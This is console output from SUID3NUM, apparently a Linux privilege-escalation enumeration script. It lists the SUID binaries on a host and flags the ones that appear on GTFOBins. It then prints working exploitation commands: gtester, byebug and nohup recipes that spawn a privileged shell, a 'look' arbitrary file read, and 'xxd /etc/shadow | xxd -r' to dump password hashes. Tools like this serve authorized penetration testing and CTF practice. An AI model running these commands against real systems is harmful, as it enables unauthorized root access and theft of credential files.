umar_0x01@b0x:~/Desktop/SUID3NUM$ python3 suid3num.py 
  ___ _   _ _ ___    _____  _ _   _ __  __ 
 / __| | | / |   \  |__ / \| | | | |  \/  |
 \__ \ |_| | | |) |  |_ \ .` | |_| | |\/| |
 |___/\___/|_|___/  |___/_|\_|\___/|_|  |_|  twitter@syed__umar

[#] Finding/Listing all SUID Binaries ..
------------------------------
/bin/zsh
/bin/umount
/bin/su
/bin/mount
/bin/ping
/bin/fusermount
/bin/nc.openbsd
/usr/bin/gtester
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/byebug
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/vim.tiny
/usr/bin/xxd
/usr/bin/nohup
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/look
/usr/sbin/vmware-authd
/usr/sbin/pppd
/usr/share/discord/chrome-sandbox
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/slack/chrome-sandbox
/usr/lib/snapd/snap-confine
/usr/lib/chromium-browser/chrome-sandbox
/usr/lib/virtualbox/VBoxVolInfo
/usr/lib/virtualbox/VBoxSDL
/usr/lib/virtualbox/VBoxNetDHCP
/usr/lib/virtualbox/VBoxNetNAT
/usr/lib/virtualbox/VBoxNetAdpCtl
/usr/lib/virtualbox/VBoxHeadless
/usr/lib/virtualbox/VirtualBoxVM
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/vmware/bin/vmware-vmx-stats
/usr/lib/vmware/bin/vmware-vmx-debug
/usr/lib/vmware/bin/vmware-vmx
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/opt/google/chrome/chrome-sandbox
/sbin/mount.ecryptfs_private
/snap/snapd/8140/usr/lib/snapd/snap-confine
/snap/core18/1754/bin/mount
/snap/core18/1754/bin/ping
/snap/core18/1754/bin/su
/snap/core18/1754/bin/umount
/snap/core18/1754/usr/bin/chfn
/snap/core18/1754/usr/bin/chsh
/snap/core18/1754/usr/bin/gpasswd
/snap/core18/1754/usr/bin/newgrp
/snap/core18/1754/usr/bin/passwd
/snap/core18/1754/usr/bin/sudo
/snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1754/usr/lib/openssh/ssh-keysign
------------------------------


[!] Default Binaries (Don't bother)
------------------------------
/bin/umount
/bin/su
/bin/mount
/bin/ping
/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/sbin/vmware-authd
/usr/sbin/pppd
/usr/share/discord/chrome-sandbox
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/slack/chrome-sandbox
/usr/lib/snapd/snap-confine
/usr/lib/chromium-browser/chrome-sandbox
/usr/lib/virtualbox/VBoxVolInfo
/usr/lib/virtualbox/VBoxSDL
/usr/lib/virtualbox/VBoxNetDHCP
/usr/lib/virtualbox/VBoxNetNAT
/usr/lib/virtualbox/VBoxNetAdpCtl
/usr/lib/virtualbox/VBoxHeadless
/usr/lib/virtualbox/VirtualBoxVM
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/vmware/bin/vmware-vmx-stats
/usr/lib/vmware/bin/vmware-vmx-debug
/usr/lib/vmware/bin/vmware-vmx
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/opt/google/chrome/chrome-sandbox
/sbin/mount.ecryptfs_private
/snap/snapd/8140/usr/lib/snapd/snap-confine
/snap/core18/1754/bin/mount
/snap/core18/1754/bin/ping
/snap/core18/1754/bin/su
/snap/core18/1754/bin/umount
/snap/core18/1754/usr/bin/chfn
/snap/core18/1754/usr/bin/chsh
/snap/core18/1754/usr/bin/gpasswd
/snap/core18/1754/usr/bin/newgrp
/snap/core18/1754/usr/bin/passwd
/snap/core18/1754/usr/bin/sudo
/snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1754/usr/lib/openssh/ssh-keysign
------------------------------


[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/bin/zsh
/bin/nc.openbsd
/usr/bin/gtester
/usr/bin/byebug
/usr/bin/vim.tiny
/usr/bin/xxd
/usr/bin/nohup
/usr/bin/look
------------------------------


[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/bin/zsh -~> https://gtfobins.github.io/gtfobins/zsh/#suid
/usr/bin/gtester -~> https://gtfobins.github.io/gtfobins/gtester/#suid
/usr/bin/byebug -~> https://gtfobins.github.io/gtfobins/byebug/#suid
/usr/bin/xxd -~> https://gtfobins.github.io/gtfobins/xxd/#suid
/usr/bin/nohup -~> https://gtfobins.github.io/gtfobins/nohup/#suid
/usr/bin/look -~> https://gtfobins.github.io/gtfobins/look/#suid
------------------------------


[&] Manual Exploitation (Binaries which create files on the system)
------------------------------
[&] Gtester ( /usr/bin/gtester )
TF=$(mktemp)
echo '#!/bin/sh -p' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
/usr/bin/gtester -q $TF

[&] Byebug ( /usr/bin/byebug )
TF=$(mktemp)
echo 'system("/bin/sh")' > $TF
/usr/bin/byebug $TF
continue

[&] Nohup ( /usr/bin/nohup )
/usr/bin/nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"

[&] Look ( /usr/bin/look )
LFILE=file_to_read
/usr/bin/look '' "$LFILE"

------------------------------


[$] Please try the command(s) below to exploit harmless SUID bin(s) found !!!
------------------------------
[~] /bin/zsh 
[~] /usr/bin/xxd /etc/shadow | xxd -r
------------------------------


[-] Note
------------------------------
If you see any FP in the output, please report it to make the script better! :)
------------------------------
